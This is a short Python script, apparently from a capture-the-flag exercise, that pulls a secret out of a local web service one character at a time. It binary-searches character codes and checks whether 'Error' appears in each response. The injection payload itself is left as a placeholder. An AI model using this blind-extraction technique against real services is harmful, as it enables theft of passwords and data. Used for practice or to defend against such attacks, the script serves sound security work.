import requests

url = "http://127.0.0.1:30032"

res = ""
while True:
    s = 0
    e = 256
    while(s<=e):
        mid = (s+e)//2
        payload = *** payload here ***
        
        response = requests.get(url=url, params={"password":payload})
        if "Error" in response.text:
            e = mid-1
        else: 
            s = mid+1
            
    if "Error" in response.text:
        mid -= 1
    res += chr(mid)
    
    if chr(mid) == "}":
        break
    print(res)
print(res)